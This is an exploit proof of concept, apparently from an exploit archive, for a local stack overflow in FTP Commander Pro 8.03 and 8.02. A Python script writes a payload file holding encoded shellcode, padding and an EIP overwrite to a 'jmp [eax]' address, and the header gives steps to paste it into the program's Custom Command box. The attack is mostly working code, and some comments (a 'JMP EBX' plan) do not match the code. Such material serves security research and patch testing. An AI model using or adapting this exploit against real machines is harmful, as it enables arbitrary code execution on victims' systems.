# Exploit Title: FTP Comander Pro 8.03 - Local Stack Overflow 
# Date: 2019-12-12
# Exploit Author: boku
# Discovered by: UN_NON
# Original DoS: FTP Commander 8.02 - Overwrite (SEH) 
# Original DoS Link: https://www.exploit-db.com/exploits/37810
# Software Vendor: http://www.internet-soft.com/
# Software Link: http://www.internet-soft.com/DEMO/cftpsetup.exe
# Version: Version 8.03 & Version 8.02 (same exploit for both)
# Tested on: Windows 10 Home 1909      (64-bit; OS-build=18363.418)
# Windows 10 Education 1909 (32-bit; OS-build=18363.418)
# Windows 10 Pro  1909      (32-bit; OS-build=18363.418)
# Windows Vista Home Basic SP1 (6.0.6001 Build 6001)
# Windows XP Professional (32-bit)- 5.1.2600 Service Pack 3 Build 2600
# Python Version:       Python 2.7.16+

# Recreate:
#   1) Generate 'poc.txt' payload using python 2.7.x
#   2) On target Windows machine, open the file 'poc.txt' with notepad, then Select-All & Copy
#   3) Install & Open ftpCommander v8.03 (or v8.02)
#   4) Go to Menu Bar > FTP-Server Drop-down > click Custom Command
#      - A textbox will appear on the bottom of the right window
#   5) Paste payload from generated txt file into textbox
#   6) Click "Do it"
#      - The program will crash & calculator will open
# Other Security Issue:    
#   - The program's default install path is: C:\\cftp\cftp.exe

#!/usr/bin/python
from re import I
import struct
import sys
from struct import pack, unpack

try:
    # EIP offset at 4108 -- if you exceed 4112 bytes you will overwrite nSEH & SEH
    #padA = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaatzaaubaaucaaudaaueaaufaaugaauhaauiaaujaaukaaulaaumaaunaauoaaupaauqaauraausaautaauuaauvaauwaauxaauyaauzaavbaavcaavdaaveaavfaavgaavhaaviaavjaavkaavlaavmaavnaavoaavpaavqaavraavsaavtaavuaavvaavwaavxaavyaavzaawbaawcaawdaaweaawfaawgaawhaawiaawjaawkaawlaawmaawnaawoaawpaawqaawraawsaawtaawuaawvaawwaawxaawyaawzaaxbaaxcaaxdaaxeaaxfaaxgaaxhaaxiaaxjaaxkaaxlaaxmaaxnaaxoaaxpaaxqaaxraaxsaaxtaaxuaaxvaaxwaaxxaaxyaaxzaaybaaycaaydaayeaayfaaygaayhaayiaayjaaykaaylaaymaaynaayoaaypaayqaayraaysaaytaayuaayvaaywaayxaayyaayzaazbaazcaazdaazeaazfaazgaazhaaziaazjaazkaazlaazmaaznaazoaazpaazqaazraazsaaztaazuaazvaazwaazxaazyaazzababacabadabaeabafabagabahabaiabajabakabalabamabanabaoabapabaqabarabasabatabauabavabawabaxabayabazabbbabbcabbdabbeabbfabbgabbhabbiabbjabbkabblabbmabbnabboabbpabbqabbrabbsabbtabbuabbvabbwabbxabbyabbzabcbabccabcdabceabcfabcgabchabciabcjabckabclabcmabcnabcoabcpabcqabcrabcsabctabcuabcvabcwabcxabcyabczabdbabdcabddabdeabdfabdgabdhabdiabdjabdkabdlabdmabdnabdoabdpabdqabdrabdsabdtabduabdvabdwabdxabdyabdzabebabecabedabeeabefabegabehabeiabejabekabelabemabenabeoabepabeqaberabesabetabeuabevabewabexabeyabezabfbabfcabfdabfeabffabfgabfhabfiabfjabfkabflabfmabfnabfoabfpabfqabfrabfsabftabfuabfvabfwabfxabfyabfzabgbabgcabgdabgeabgfabggabghabgiabgjabgkabglabgmabgnabgoabgpabgqabgrabgsabgtabguabgvabgwabgxabgyabgzabhbabhcabhdabheabhfabhgabhhabhiabhjabhkabhlabhmabhnabhoabhpabhqabhrabhsabhtabhuabhvabhwabhxabhyabhzabibabicabidabieabifabigabihabiiabijabikabilabimabinabioabipabiqabirabisabitabiuabivabiwabixabiyabizabjbabjcabjdabjeabjfabjgabjhabjiabjjabjkabjlabjmabjnabjoabjpabjqabjrabjsabjtabjuabjvabjwabjxabjyabjzabkbabkcabkdabkeabkfabkgabkhabkiabkjabkkabklabkmabknabkoabkpabkqabkrabksabktabkuabkvabkwabkxabkyabkzablbablcabldableablfablgablhabliabljablkabllablmablnabloablpablqablrablsabltabluablvablwablxablyablzabmbabmcabmdabmeabmfabmgabmhabmiabmjabmkabmlabmmabmnabmoabmpabmqabmrabmsabmtabmuabmvabmwabmxabmyabmzabnbabncabndabneabnfabngabnhabniabnjabnkabnlabnmabnnabnoabnpabnqabnrabnsabntabnuabnvabnwabnxabnyabnzabobabocabodaboeabofabogabohaboiabojabokabolabomabonabooabopaboqaborabosabotabouabovabowaboxaboyabozabpbabpca"
    
    nops=b'CGS[BOKU]J'*100
    
    shellcode  = b""
    shellcode += b"\x54\x5f\xd9\xea\xd9\x77\xf4\x5b\x53\x59\x49"
    shellcode += b"\x49\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5a"
    shellcode += b"\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30"
    shellcode += b"\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41"
    shellcode += b"\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42"
    shellcode += b"\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a"
    shellcode += b"\x49\x4b\x4c\x4b\x58\x4c\x42\x43\x30\x43\x30"
    shellcode += b"\x43\x30\x55\x30\x4c\x49\x4a\x45\x50\x31\x39"
    shellcode += b"\x50\x55\x34\x4c\x4b\x50\x50\x50\x30\x4c\x4b"
    shellcode += b"\x56\x32\x54\x4c\x4c\x4b\x31\x42\x45\x44\x4c"
    shellcode += b"\x4b\x53\x42\x56\x48\x34\x4f\x48\x37\x30\x4a"
    shellcode += b"\x37\x56\x36\x51\x4b\x4f\x4e\x4c\x37\x4c\x53"
    shellcode += b"\x51\x53\x4c\x45\x52\x36\x4c\x37\x50\x59\x51"
    shellcode += b"\x38\x4f\x34\x4d\x43\x31\x38\x47\x4b\x52\x4b"
    shellcode += b"\x42\x31\x42\x36\x37\x4c\x4b\x56\x32\x52\x30"
    shellcode += b"\x4c\x4b\x50\x4a\x37\x4c\x4c\x4b\x30\x4c\x42"
    shellcode += b"\x31\x43\x48\x5a\x43\x30\x48\x43\x31\x4e\x31"
    shellcode += b"\x46\x31\x4c\x4b\x56\x39\x47\x50\x55\x51\x59"
    shellcode += b"\x43\x4c\x4b\x51\x59\x54\x58\x4d\x33\x46\x5a"
    shellcode += b"\x37\x39\x4c\x4b\x36\x54\x4c\x4b\x33\x31\x39"
    shellcode += b"\x46\x56\x51\x4b\x4f\x4e\x4c\x4f\x31\x38\x4f"
    shellcode += b"\x54\x4d\x45\x51\x58\x47\x47\x48\x4b\x50\x42"
    shellcode += b"\x55\x4b\x46\x45\x53\x43\x4d\x4b\x48\x37\x4b"
    shellcode += b"\x43\x4d\x31\x34\x52\x55\x4b\x54\x50\x58\x4c"
    shellcode += b"\x4b\x36\x38\x56\x44\x45\x51\x38\x53\x32\x46"
    shellcode += b"\x4c\x4b\x44\x4c\x50\x4b\x4c\x4b\x46\x38\x35"
    shellcode += b"\x4c\x45\x51\x49\x43\x4c\x4b\x44\x44\x4c\x4b"
    shellcode += b"\x55\x51\x4e\x30\x4d\x59\x30\x44\x31\x34\x57"
    shellcode += b"\x54\x51\x4b\x31\x4b\x35\x31\x50\x59\x51\x4a"
    shellcode += b"\x46\x31\x4b\x4f\x4b\x50\x31\x4f\x51\x4f\x30"
    shellcode += b"\x5a\x4c\x4b\x44\x52\x4a\x4b\x4c\x4d\x51\x4d"
    shellcode += b"\x42\x48\x30\x33\x57\x42\x53\x30\x35\x50\x42"
    shellcode += b"\x48\x44\x37\x32\x53\x37\x42\x51\x4f\x50\x54"
    shellcode += b"\x32\x48\x30\x4c\x53\x47\x46\x46\x54\x47\x4b"
    shellcode += b"\x4f\x48\x55\x58\x38\x4c\x50\x35\x51\x45\x50"
    shellcode += b"\x53\x30\x37\x59\x39\x54\x31\x44\x30\x50\x55"
    shellcode += b"\x38\x36\x49\x4b\x30\x52\x4b\x43\x30\x4b\x4f"
    shellcode += b"\x48\x55\x53\x5a\x53\x38\x51\x49\x36\x30\x4a"
    shellcode += b"\x42\x4b\x4d\x37\x30\x36\x30\x31\x50\x56\x30"
    shellcode += b"\x35\x38\x5a\x4a\x54\x4f\x59\x4f\x4d\x30\x4b"
    shellcode += b"\x4f\x39\x45\x4a\x37\x45\x38\x45\x52\x33\x30"
    shellcode += b"\x34\x51\x31\x4b\x4d\x59\x4a\x46\x43\x5a\x42"
    shellcode += b"\x30\x30\x56\x36\x37\x33\x58\x4f\x32\x49\x4b"
    shellcode += b"\x56\x57\x43\x57\x4b\x4f\x58\x55\x31\x47\x52"
    shellcode += b"\x48\x58\x37\x4b\x59\x47\x48\x4b\x4f\x4b\x4f"
    shellcode += b"\x49\x45\x51\x47\x55\x38\x42\x54\x4a\x4c\x37"
    shellcode += b"\x4b\x4d\x31\x4b\x4f\x59\x45\x56\x37\x4d\x47"
    shellcode += b"\x35\x38\x33\x45\x52\x4e\x30\x4d\x45\x31\x4b"
    shellcode += b"\x4f\x48\x55\x33\x58\x33\x53\x32\x4d\x52\x44"
    shellcode += b"\x45\x50\x4c\x49\x4a\x43\x56\x37\x56\x37\x56"
    shellcode += b"\x37\x50\x31\x5a\x56\x43\x5a\x54\x52\x51\x49"
    shellcode += b"\x36\x36\x4d\x32\x4b\x4d\x42\x46\x59\x57\x30"
    shellcode += b"\x44\x47\x54\x57\x4c\x43\x31\x33\x31\x4c\x4d"
    shellcode += b"\x37\x34\x37\x54\x32\x30\x39\x56\x55\x50\x31"
    shellcode += b"\x54\x36\x34\x56\x30\x36\x36\x31\x46\x46\x36"
    shellcode += b"\x57\x36\x30\x56\x50\x4e\x30\x56\x30\x56\x51"
    shellcode += b"\x43\x36\x36\x45\x38\x34\x39\x38\x4c\x37\x4f"
    shellcode += b"\x4c\x46\x4b\x4f\x48\x55\x4c\x49\x4b\x50\x50"
    shellcode += b"\x4e\x56\x36\x47\x36\x4b\x4f\x56\x50\x53\x58"
    shellcode += b"\x55\x58\x4b\x37\x35\x4d\x53\x50\x4b\x4f\x38"
    shellcode += b"\x55\x4f\x4b\x4c\x30\x48\x35\x49\x32\x50\x56"
    shellcode += b"\x32\x48\x39\x36\x4d\x45\x4f\x4d\x4d\x4d\x4b"
    shellcode += b"\x4f\x58\x55\x57\x4c\x33\x36\x53\x4c\x55\x5a"
    shellcode += b"\x4b\x30\x4b\x4b\x4b\x50\x43\x45\x54\x45\x4f"
    shellcode += b"\x4b\x30\x47\x52\x33\x34\x32\x32\x4f\x52\x4a"
    shellcode += b"\x53\x30\x46\x33\x4b\x4f\x59\x45\x41\x41"
    
    padA = b"A" * (4108 - len(nops + shellcode))
    
    # The EAX register holds a Pointer to the beginning of our buffer
    #   FF20 = jmp [eax]
    #   !mona find -o -s '\xFF\x20' 
    #   0x0041081a : '\xFF\x20' | startnull,ascii {PAGE_EXECUTE_READ} [ftpcomm.exe] 
    #   | ASLR: False; Rebase: False; SafeSEH: False;
    
    # eip        = b'\x1a\x08\x41'   # 3 byte overwrite so we can set EIP to start with 0x00
    eip = b"\x1a\x08\x41"  # 0x41081a ; jmp [eax]
    
    # bad_chars = \x00\x0d\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e
    bad_char = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0e\x0f\x10"
    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    b"\x81\x8d\x8f\x90"
    b"\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
    
    
    
    # 0. Pad A buffera (4108)
    # 1. EIP = JMP EBX ; EBX is located somewhere on pad A
    # 2. Place shellcode in EBX memory by calculating where JMP EBX lands with pad A buffer
    #    Calculate offset with cyclictic pattern
    # 3. Pad B buffer to reach EIP offset, don't go past 4112 or nSEH & SEH overwrite
    # 4. padA + shellcode + padB + eip(jmp ebx ; ebx = 0x41414141)

    # After jmp [eax], we land at the beginning of our buffer
    payload    = nops + shellcode + padA + eip
    File       = b'poc.txt'
    f          = open(File, 'wb')  # open file for write
    f.write(payload)
    f.close()                     # close the file
    print(b" created successfully ")

except:
    print(b' failed to create')
